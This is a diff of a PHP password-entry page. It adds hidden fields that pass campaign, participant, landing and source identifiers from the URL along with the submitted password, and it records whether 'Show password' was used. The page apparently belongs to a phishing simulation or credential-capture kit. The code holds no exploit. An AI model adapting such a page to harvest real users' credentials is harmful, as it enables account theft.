@@ -1,5 +1,11 @@
 <?php
 $identifier = isset($_GET['identifier']) ? trim((string) $_GET['identifier']) : '';
+$trackingFields = ['campaign_id', 'participant_id', 'landing_id', 'source'];
+$tracking = [];
+
+foreach ($trackingFields as $field) {
+    $tracking[$field] = isset($_GET[$field]) ? trim((string) $_GET[$field]) : '';
+}
 ?>
 <!doctype html>
 <html lang="en">
@@ -35,6 +41,9 @@ $identifier = isset($_GET['identifier']) ? trim((string) $_GET['identifier']) : 
 
             <form class="password-side" action="submit.php" method="post">
                 <input type="hidden" name="identifier" value="<?php echo htmlspecialchars($identifier, ENT_QUOTES, 'UTF-8'); ?>">
+                <?php foreach ($tracking as $field => $value): ?>
+                    <input type="hidden" name="<?php echo htmlspecialchars($field, ENT_QUOTES, 'UTF-8'); ?>" value="<?php echo htmlspecialchars($value, ENT_QUOTES, 'UTF-8'); ?>">
+                <?php endforeach; ?>
 
                 <label class="password-input">
                     <span class="sr-only">Password</span>
@@ -42,7 +51,7 @@ $identifier = isset($_GET['identifier']) ? trim((string) $_GET['identifier']) : 
                 </label>
 
                 <label class="show-password">
-                    <input type="checkbox">
+                    <input type="checkbox" name="password_revealed" value="1">
                     <span class="checkbox" aria-hidden="true"></span>
                     <span>Show password</span>
                 </label>
